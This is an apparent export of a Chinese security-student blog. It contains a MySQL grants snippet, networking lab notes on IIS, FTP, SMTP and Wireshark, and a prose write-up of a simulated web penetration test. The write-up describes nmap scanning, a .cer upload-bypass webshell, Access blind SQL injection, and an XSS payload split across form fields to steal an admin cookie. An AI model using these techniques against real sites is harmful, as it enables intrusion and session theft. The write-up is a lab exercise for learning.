<span class="keyword">to</span> <span class="keyword">user</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'passwd'</span>;</span><br></pre></td></tr></table></figure><p>2) 刷新权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p>3)显示授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span>;  //这句话只显示当前登录用户的权限</span><br></pre></td></tr></table></figure><p>4) 移除授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">delete</span> <span class="keyword">on</span> *.* <span class="keyword">from</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure><p>5) 删除用户<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p>6) 给用户改名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">user</span> <span class="string">'jack'</span>@<span class="string">'%'</span> <span class="keyword">to</span> <span class="string">'jim'</span>@<span class="string">'%'</span>;``</span><br></pre></td></tr></table></figure></p><p>7) 给用户改密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> = <span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Mysql安全配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql安全配置 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记录一次模拟渗透</title>
      <link href="/2018/07/25/pentest-1/"/>
      <url>/2018/07/25/pentest-1/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天还模拟了一次真实的挖洞过程，今天这网站一共有三个漏洞（都是要经过提醒才能弄出来），因为是搭的环境，简单记录一下思路，顺便当个回顾，源码啥的都没有了<a id="more"></a>，耍完就要求删掉了。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这台服务器有个前提就是跟我们一个网段的服务器，并且开了IIS服务，但是前提我们是不知道他的ip的，这个时候我们需要用一下nmap来扫一下同一网段下的ip  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -PI -PT 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>记得当时出现了三个ip地址，再使用nmap去扫描各个ip的端口，命令是<code>namp 你锁定的ip地址</code></p><p>发现中间的第二个ip是有开IIS服务的，但是也开了其他端口的服务，这时候我们需要注意的是目标不要仅仅盯着IIS这个服务端口，我们也需要把其他不是常用端口都是尝试一遍，其中一些常见的端口要知道，常开的我们就可以选择性忽略，比如<code>3306可以远程连接数据库，3389远程连接，445端口永恒之蓝的端口</code>等等，遇到这些端口先记着，因为我们前提是不准使用msf打，毕竟我们练的是网站渗透的思路。所以还是回来网站的渗透思路上吧。</p><p>当时尝试到其中的<code>8888端口</code>的时候，就出现了一个网站，随便点两下，发现是一个asp的网站，这点很重要，不然到后期的时候上传木马的时候传了个php的小马就很搞笑了。</p><p>首先先扫描一波目录，这里我用的是一款很经典的扫描工具御剑，其实github上还有很多类似的扫描工具，就不多说了，扫到了一个类似源码的压缩包，这在正常情况下是很大的漏洞了，打开源码第一件事情先要去找配置文件，数据库配置文件之类的，由于这里用的是Access数据库，而<code>Access数据库</code>使用的是<code>文件存储</code>，在里面我们可以很轻易地找到后台登录管理员账号密码，只不过密码需要解密一下，此时也扫到了后台了登录页面，先登录一波，这时候我的思路先点一下查看一下是否有上传的地方，发现有图片上传的地方，因为源码已经得到了，我就去看源码关于上传这一部分的代码，这里面我审计出来可以用<code>cer</code>去改后缀名上传去执行，这里我们还需要注意下常见的除了<code>asp，aspx</code>可以执行以外，还有<code>cgi，cer</code>之类的后缀名可以尝试上传一下，最后上传之后就获得了网站的全权限了。</p><p>第二个漏洞是在某一个二级域名下存在的SQL注入漏洞，用的<code>and 1=1</code>还有<code>and1=2</code>测出来的，服务器返回了500作为盲注的回显点，参考了这篇文章:<code>https://blog.csdn.net/u011781521/article/details/53942183</code>, Access数据库的注入比较麻烦，我尝试出来是一个盲注，但是Access盲注在后期的表名全靠猜，字典里面没有就GG了。后面也是获得后台登录的密码。回到前面的步骤去getshell了。</p><p>第三个漏洞是一个XSS漏洞，这里也是别人提醒我才会用这种骚操作去得到管理员的cookie然后登陆后台，当时教我用xss平台去实现这一过程，在一个填写简历的的表单里面去实现，测试发现最大的两个文本框已经是编码实例化了，过滤了一大堆东西，就不可以利用了，问题是在上面填写学历还有姓名之类的地方存在xss，这里不得不赞一波这个xss平台，能将一大段js代码，变成一个短链接，缩小了代码量，别人就会更大的机会去点击，这里还学到的就是xss在点击查看源码的时候应该是要查看框架的源码，有时候可能直接右键看源码看到的是其他div的代码了，就看不清楚xss是否起了作用，而且这里的文本框限制了大小我们可以用Bp去实现发包实现，但是我查看源码发现缺了一段，原因就是Access里面限制了大小，那这个时候我们可以这样去绕过，注释符是一个好东西，分别在两个文本框里面填入<code>/*</code>和<code>*/</code>,就例如在姓名里面填入<code>&lt;script&gt;alert(1)/*</code>在学历的框里面填入<code>*/&lt;/script&gt;</code>这样测试就很OK，右键查看源码就可以发现在/**/里面就很多其他代码，但是就相当于注释掉了，刚好把两个框里面的代码拼在一起了，只是例举了一个反射型xss。这样就可以返回你的xss平台看你打的结果。然后就可以把cookie获得最好的方法就是直接在浏览器里面改变你需要的cookie，不然的话尝试一下用bp发包每一次都是需要改一次cookie的，因为页面的每一部分功能打开都是需要重新使用cookie，而本地保存的又不是你xss打回来的cookie，因此需要修改多次cookie，而最好的解决方法就是直接修改浏览器本地保存的cookie就好。登录后台又回到上传漏洞去了，233333。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>全文字，没有图片，终于把今天的思路回想了一遍。。。。</p>]]></content>
      
      <categories>
          
          <category> 网站渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>计网实验笔记(二)</title>
      <link href="/2018/07/20/comp-net-2/"/>
      <url>/2018/07/20/comp-net-2/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博客是接着上一篇的实验总结，这部分的实验是网络服务器配置设计，这部分感觉就有点水。<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><strong>实验内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1) 在PC机上下载安装IIS，学习IIS的组成和功能，以及IIS的使用方法。</span><br><span class="line">(2) 分别在本机进行WebServer、EmailServer、FTPServer的配置设计；</span><br><span class="line">(3) 通过另外一台接入互联网的PC机（或自己的手机）的通用客户程序（浏览器或DOS终端）访问自己设置的WebServer、EmailServer、FTPServer。</span><br></pre></td></tr></table></figure><h3 id="实验内容一"><a href="#实验内容一" class="headerlink" title="实验内容一"></a>实验内容一</h3><p>首先从控制面板里面找到程序然后去选择打开或关闭windows功能，选择Web管理工具还有万维网服务<br><img src="https://s1.ax1x.com/2018/07/20/P3oe8H.png" alt="P3oe8H.png"><br>然后回去控制面板里面选择管理工具，打开第一个IIS管理器<br><a href="https://imgchr.com/i/P3onxA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3onxA.md.png" alt="P3onxA.md.png"></a><br>点击左边的网站然后去新建一个网站，我的配置信息如下，IP地址为192.168.19.1，网站的源码目录在放在该电脑下的C盘目录下的www目录下，这里可以自己设置域名<br><img src="https://s1.ax1x.com/2018/07/20/P3oKKI.png" alt="P3oKKI.png"></p><p>点击新建立的网站还可以去设定默认的页面是什么<br><a href="https://imgchr.com/i/P3oMrt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3oMrt.md.png" alt="P3oMrt.md.png"></a><br>在www目录下编写一个HTML页面，代码内容如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">        My frrst Page!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p1</span>&gt;</span>这是我第一个Web服务器<span class="tag">&lt;/<span class="name">p1</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在本机浏览器目录下输入对应的IP地址也就是刚刚设定IP，浏览器上有回显内容<br><img src="https://s1.ax1x.com/2018/07/20/P3oyiF.png" alt="P3oyiF.png"></p><h3 id="实验内容二"><a href="#实验内容二" class="headerlink" title="实验内容二"></a>实验内容二</h3><p><strong>WebServe的配置设计</strong><br>上网随便下载一个ASP源码，然后放在所设定的网页目录下，设置默认网站访问index.html,配置的相关信息，步骤跟上面配置IIS服务器差不多<br><img src="https://s1.ax1x.com/2018/07/20/P3o7Je.png" alt="P3o7Je.png"><br>本机访问219.219.68.183:8080,浏览器有回显<br><a href="https://imgchr.com/i/P3oHRH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3oHRH.md.png" alt="P3oHRH.md.png"></a></p><p><strong>FTPServer的配置设计</strong><br>FTP服务的开启跟IIS的开启有点类似，从控制面板里面找到程序然后去选择打开或关闭windows功能，选择FTP服务器的选项<br><img src="https://s1.ax1x.com/2018/07/20/P3oXLt.png" alt="P3oXLt.png"></p><p>然后就开始配置FTP服务器，选中一个目录用来存放你提供访问以及下载的文件<br>电脑的C盘下设置C:\FTP，该目录下有很多子目录供访问，上传和下载。<br>然后在IIS管理器里面新建一个FTP站点，然后设置相关的信息<br><img src="https://s1.ax1x.com/2018/07/20/P3oveP.png" alt="P3oveP.png"><br><img src="https://s1.ax1x.com/2018/07/20/P3oxdf.png" alt="P3oxdf.png"></p><p>然后设置身份信息还有权限，设置匿名用户的话就允许其他人访问了，如果有特殊要求再设置其他用户类型，点击完成就可以开启该服务了<br><img src="https://s1.ax1x.com/2018/07/20/P3TFQs.png" alt="P3TFQs.png"></p><p>在本机浏览器上输入自己设定的ip,输入<code>ftp://219.219.61.183,</code>浏览器上显示目标文件夹内的所有文件，并支持下载，如图<br><a href="https://imgchr.com/i/P3Tkyn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Tkyn.md.png" alt="P3Tkyn.md.png"></a></p><p><strong>SMTP服务器的配置</strong><br>这里原本的配置原本是想直接在windows上面实现的，都是后来发现了一种更好的方可以用思科这款工具完成，其实上面的实验也可以直接模仿，网络拓扑图就是下面的结构，<br><a href="https://imgchr.com/i/P3TZwV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3TZwV.md.png" alt="P3TZwV.md.png"></a><br>但是就单单配置邮箱服务器的话，我就把拓扑图简化，形成下面的拓扑图，需要注意的是在没有DHCP服务器的的情况下，需要自己静态去配置IP地址，域名服务器保留<br><img src="https://s1.ax1x.com/2018/07/20/P3TeoT.png" alt="P3TeoT.png"></p><p>PC1还有PC2两台机子的IP设置如下，还有MAIL和DNS服务器的IP地址设置<br><img src="https://s1.ax1x.com/2018/07/20/P37Gcj.png" alt="P37Gcj.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37Jjs.png" alt="P37Jjs.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37tun.png" alt="P37tun.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37NBq.png" alt="P37NBq.png"><br>然后再配置DNS服务器里面的相关域名，其他无用的服务我们可以关掉<br><a href="https://imgchr.com/i/P37wNT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37wNT.md.png" alt="P37wNT.md.png"></a><br>然后配置邮箱服务器，注意这里要配置的两个用户名与密码跟后面PC1和PC2配置的要一致。我这里设置的是test1和test2<br><a href="https://imgchr.com/i/P37DCF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37DCF.md.png" alt="P37DCF.md.png"></a><br>然后在PC1和PC2里面配置相对应邮件信息，这时候上面配置的用户名就有用了<br><img src="https://s1.ax1x.com/2018/07/20/P37sgJ.png" alt="P37sgJ.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37yv9.png" alt="P37yv9.png"><br>点击PC1邮件功能里面的compose编辑发送邮件的信息，然后Send<br><a href="https://imgchr.com/i/P37cuR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37cuR.md.png" alt="P37cuR.md.png"></a></p><p>从receive里查看接受的信息，收到刚才发送的信息了<br><img src="https://s1.ax1x.com/2018/07/20/P37gD1.png" alt="P37gD1.png"><br>同理，PC2也能同样的接受发送信息</p><h3 id="实验内容三"><a href="#实验内容三" class="headerlink" title="实验内容三"></a>实验内容三</h3><p>手机访问Webserver，也就是219.219.68.183:8080,手机上回显网页信息，搭建成功<br><img src="https://s1.ax1x.com/2018/07/20/P372Hx.jpg" alt="P372Hx.jpg"></p><p>同样手机访问FTPserver，填写好信息,手机上回显网页信息，连接成功<br><a href="https://imgchr.com/i/P37WE6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37WE6.md.png" alt="P37WE6.md.png"></a><br>对于邮箱服务器用PC1跟PC2互相发送邮件:<br><a href="https://imgchr.com/i/P375CD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P375CD.md.png" alt="P375CD.md.png"></a><br><a href="https://imgchr.com/i/P37I8e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37I8e.md.png" alt="P37I8e.md.png"></a><br>两台机子都能够互相接收邮件，成功验证</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>突然发现仿真软件真的是强大，本来还是想在win7的机子上直接模拟的邮箱服务器，发现死活都不行，没想到仿真软件还能这样玩，自己还是太菜，啥都不知道。。。。关于邮件，smtp协议只是一个发送的协议，接收邮件的时候用的可是pop以及imap协议，这还是要注意一下的，不过现在的发邮件都是被http封装的，也就是直接从web里面直接完成操作，即使改变了UA到服务器那一段，但是两个邮箱服务器之间传输的协议还是没有变的，依旧是smtp。。。</p><p>放暑假了啊！！！</p>]]></content>
      
      <categories>
          
          <category> 计算机网路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网路 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>计网实验笔记(一)</title>
      <link href="/2018/07/20/comp-net-1/"/>
      <url>/2018/07/20/comp-net-1/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这一篇是对协议报文的分析，这里面有对Wireshark的使用，只能说我对于Wireshark这款软件的使用还是渣。各种ip地址的过滤以及如何去利用Wireshark强大的搜索功能这里就不多说了。个人感觉最好的方法就是在CTF里面的流量分析题目里学，在CTF的流量分析题目里面你会经常触碰到那种要导出文件图片，导进秘钥解密https的各种类型题，感觉学的会更快。</p><p>不多说废话下面上课实验的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1） 运用抓包工具，分别获取不同互联网访问情形下的本机网卡数据包；过滤捕获和过滤显示不同条件的数据包。</span><br><span class="line">（2）分别对不同互联网访问情形下的数据包进行逐层分析，给出各层协议的主要参数及意义；要求分别获取WWW服务、Email服务、QQ通信和迅雷文件下载四种不同网络服务过程中的数据包。</span><br><span class="line">（3）运用抓包工具，连续获取面向连接的互联网访问情形下的本机网卡数据包；对连续获取的数据包找到执行面向连接过程的报文，给出实现面向连接过程（TCP三次握手）的详细分析。</span><br></pre></td></tr></table></figure></p><h3 id="实验内容第一点"><a href="#实验内容第一点" class="headerlink" title="实验内容第一点"></a>实验内容第一点</h3><p><strong>http协议</strong><br>关于这个协议，个人理解是万维网的服务协议，默认端口是80端口，运输层使用的是可靠的TCP，不过现在也有它的加密版本https，也就是在http的基础上增加了ssl去加密，默认端口是443，所以在我们需要解密含有https的报文的时候，想查看更多的信息，应该追踪http流而不应该追踪tcp，到运输层的时候已经加密了，看不出啥东西的，我记得DDCTF里面有一道流量分析的题目就是这样的，里面可以导出一个图片然后运用的是ocr把秘钥提取出来。确实有点烦，ocr这东西不准。对于Wireshark里面的分组，我们可以直接过滤http就可以获得啦，前提是记得访问http的页面，别访问https的页面，233333，不然你只能顾虑的是https了。</p><p><a href="https://imgchr.com/i/P3dftU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P3dftU.md.png" alt="P3dftU.md.png"></a></p><p><strong>UDP协议</strong><br>UDP协议是面向报文的一种协议，如果你观察他的封装，你会发现客户给他什么数据他就直接封装网下层IP层送去，不像TCP一样会有时候会对报文的进行分组处理，所以一般UDP都是不可靠，无连接的，除非上层的应用程序承担了检错的任务，所以UDP协议追求的是效率，一般都用在视频语音上了。我们在抓包的时候直接使用udp就可以过滤网络中的udp用户数据报文了。</p><p><a href="https://imgchr.com/i/P30lMd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30lMd.md.png" alt="P30lMd.md.png"></a></p><p><strong>TCP协议</strong><br>TCP协议是是一种面向字节流，可靠，面向连接的协议，他对于用户传送的报文可以进行分组形成报文段，其中协议中如何保证传输的正确性，如何进行拥塞控制，如何进行连接的建立以及释放都是重点，为了复习，还是回顾一下吧，其中保证传输的正确性窗口(窗口的概念就不多讲了)的作用至关重要，其中最为重要的是其中的ARQ协议(自动重传协议)，对于拥塞控制，最重要的还是那四个算法，慢开始，拥塞避免，快重传，快恢复，关键点就在拥塞窗口值以及门限值的变化并且在不同情况下使用的算法也不一样，慢开始是使用在一开始的时候以及发现超时的时候使用的，而快重传，快恢复是在在超时计数器结束前连续收到三个响应报文使用的。在过滤的时候我们只需要用tcp命令就可把TCP报文给滤出来了。</p><p><a href="https://imgchr.com/i/P30YIf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30YIf.md.png" alt="P30YIf.md.png"></a></p><p><strong>ICMP协议</strong><br>ICMP协议是一种用于报告错误信息的协议，位于IP层，我们平常使用的ping，tracert命令都是属于这一协议里面的，这两个命令都十分常用，ping用于及钠盐网络是否连通，而是用tracert命令我们可以探测出网络拓扑结构，所以要抓到icmp的报文，只需要ping一下然后在Wireshark里面用icmp这一个命令过滤出来即可。<br><a href="https://imgchr.com/i/P32ksU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P32ksU.md.png" alt="P32ksU.md.png"></a></p><h3 id="实验内容第二点"><a href="#实验内容第二点" class="headerlink" title="实验内容第二点"></a>实验内容第二点</h3><p>先把各部分的包的先过滤出来</p><p><strong>WWW服务数据包:</strong><br><a href="https://imgchr.com/i/P3RwN9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RwN9.md.png" alt="P3RwN9.md.png"></a><br><strong>Email服务数据包:</strong><br><a href="https://imgchr.com/i/P3Rlhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Rlhn.md.png" alt="P3Rlhn.md.png"></a><br><strong>QQ通信数据包:</strong><br><a href="https://imgchr.com/i/P3R0hR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3R0hR.md.png" alt="P3R0hR.md.png"></a></p><p><strong>迅雷文件下载服务数据包:</strong><br><a href="https://imgchr.com/i/P3RqHg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RqHg.md.png" alt="P3RqHg.md.png"></a></p><p>不同互联网访问情形下的数据包进行逐层分析，先Packet Details Pane(封包详细信息)有大致理解, 显示封包中的字段，各行信息说明如下：</p><ol><li>Frame:  物理层的数据帧概况(这是最底层的，一般以比特流传送，看不懂)</li><li>Ethernet II:  数据链路层以太网帧头部信息，</li><li>Internet Protocol Version 4:  互联网层IP包头部信息</li><li>Transmission Control Protocol:  传输层T的数据段头部信</li><li>Hypertext Transfer Protocol:  应用层的信息</li></ol><p><strong>UDP数据包详细分析：</strong><br><a href="https://imgchr.com/i/P3W85d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3W85d.md.png" alt="P3W85d.md.png"></a><br>这个数据包的详细信息里面包含了物理层(Frame那一行)，数据链路层(Ethernet那一行)，网路层(Internet Protocol那一行)，传输层(User Datagram Protocol那一行)还有应用层数据，层次结构十分明显。<br>从UDP的报文格式可以得到UDP的首部信息，源端口为4026，目的端口为8000，UDP长度为55，检验和为0x4362<br><a href="https://imgchr.com/i/P3hE11" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hE11.md.png" alt="P3hE11.md.png"></a><br>再看IP层的内容<br><a href="https://imgchr.com/i/P3hZX6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hZX6.md.png" alt="P3hZX6.md.png"></a><br>可以清楚分析出他的首部信息，首部长为20字节，还有标识位5428，3位没有设置的标志位以及总长度偏移量，TTL为64，协议字段17，代表了上层使用UDP，下面就是源IP为192.168.1.101，目的IP为140.207.62.105<br>再往下分析就是数据链路层了，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hmnK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hmnK.md.png" alt="P3hmnK.md.png"></a></p><p><strong>http数据包详细分析：</strong><br><a href="https://imgchr.com/i/P3htnf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3htnf.md.png" alt="P3htnf.md.png"></a><br>对于http数据进行分析，发现还是离不开五层协议，物理层，数据链路层，网路层，传输层，还有应用层，层次结构十分明显，这一次应用层以http报文显示，里面传递的的东西很明确，通过GET方式访问网站资源，访问的主机名为pub.idqqimg.com,还有其他的一些浏览器相关的信息等等。<br><a href="https://imgchr.com/i/P3hwNQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hwNQ.md.png" alt="P3hwNQ.md.png"></a><br> 下面一层是TCP，可以看出TCP首部信息，我们也可以从另一个方面推出http协议使用的运输层协议是tcp，源端口为18122，目的端口为80，还有它的序号以及确认信号，还可以看到标志位Flags，窗口大小为32768，首部长度为20，检验和是0x0dfc,紧急指针Urgent pointer置0<br> <a href="https://imgchr.com/i/P3hD9s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hD9s.md.png" alt="P3hD9s.md.png"></a><br>再看IP层的内容，可以清楚分析出他的首部信息，版本号为4，首部长为20字节，还有标识633，3位没有设置的标志位Flags以及总长度偏移量，TTL为64，协议字段6，代表了上层使用TCP，下面就是源IP为192.168.1.101，目的IP为157.0.149.41<br><a href="https://imgchr.com/i/P3hscq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hscq.md.png" alt="P3hscq.md.png"></a><br>分析数据链路层，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hcuV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hcuV.md.png" alt="P3hcuV.md.png"></a></p><p><strong>TCP包详细分析：</strong><br><a href="https://imgchr.com/i/P3h2HU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h2HU.md.png" alt="P3h2HU.md.png"></a><br>分析TCP同样可以看出TCP首部信息，源端口为18122，目的端口为80，还有它的序号以及确认<br>信号，还可以看到标志位Flags，窗口大小为65535，首部长度为20，检验和是0x16eb,紧急指针Urgent pointer置0<br>IP层的内容，可以清楚分析出他的首部信息，版本号为4，首部长为20字节，还有标识631，3位没有设置的标志位Flags以及总长度偏移量，TTL为64，协议字段6，代表了上层使用TCP，下面就是源IP为192.168.1.101，目的IP为157.0.149.41<br><a href="https://imgchr.com/i/P3hh4J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hh4J.md.png" alt="P3hh4J.md.png"></a></p><p>数据链路层，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3h5C9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h5C9.md.png" alt="P3h5C9.md.png"></a></p><p><strong>ICMP包详细分析：</strong><br>使用icmp过滤相关的报文，分析根据报文格式分析icmp包里面的内容，Type显示8表明这是一个请求报文<br><img src="https://s1.ax1x.com/2018/07/20/P3hog1.png" alt="P3hog1.png"><br>分析网络层和数据链路层跟前面几次没什么区别，源IP为192.168.1.101，目的IP为192.168.1.100，IP首部为20字节，IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hHu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hHu6.md.png" alt="P3hHu6.md.png"></a><br><a href="https://imgchr.com/i/P3hbDK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hbDK.md.png" alt="P3hbDK.md.png"></a></p><p><strong>分析QQ的报文：</strong><br><a href="https://imgchr.com/i/P34ZCj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34ZCj.md.png" alt="P34ZCj.md.png"></a><br>对于QQ的包可以得出来应用层是使用了OICQ的协议，里面包含了QQ号的信息以及加密过了的数据，使用的是UDP的传输协议，源端口是8000，目的端口是4026<br>对于网络层以及数据链路层是一样的分析过程，源IP是140.207.62.150，目的IP是192.168.1.101，传输层使用的是UDP，TTL是55<br><a href="https://imgchr.com/i/P34m2n" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34m2n.md.png" alt="P34m2n.md.png"></a></p><p><strong>对邮件包分析：</strong><br><a href="https://imgchr.com/i/P34nvq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34nvq.md.png" alt="P34nvq.md.png"></a><br>可以看得出来邮件传送有一个建立连接的过程，从哪里发的并且在哪里接收都有对应的邮箱，建立连接的密码用base64加密过了，看下层运输层是使用TCP建立连接的，目的端口是17379，源端口号25，窗口值138，序号是454，IP版本是IPv4，源IP是192.168.1.101，  目的IP是123.125.50.138</p><h3 id="实验内容第三点"><a href="#实验内容第三点" class="headerlink" title="实验内容第三点"></a>实验内容第三点</h3><p>访问网站<code>www.souci.li</code>,过滤http然后追踪tcp流就可以看见http协议工作的大概过程(在这之前应该还得通过DNS去解析域名，你会发现这个包过滤DNS会发现把域名转换成IP的过程)，然后就是封装http请求数据包，封装成tcp包，建立tcp连接（三报文握手在HTTP工作开始 之前，客户机（Web浏览器）首先要通过网络与服务器建立连接，该连接是通过TCP来完成的，客户端发送请求，服务器响应，服务器关闭tcp连接<br><a href="https://imgchr.com/i/P35j1A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35j1A.md.png" alt="P35j1A.md.png"></a><br><a href="https://imgchr.com/i/P35v6I" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35v6I.md.png" alt="P35v6I.md.png"></a><br>分析三报文握手的过程：<br><strong>第一次报文握手</strong><br><a href="https://imgchr.com/i/P3Ip0f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Ip0f.md.png" alt="P3Ip0f.md.png"></a><br>客户端发送一个TCP，标志位为SYN，序列号为0， 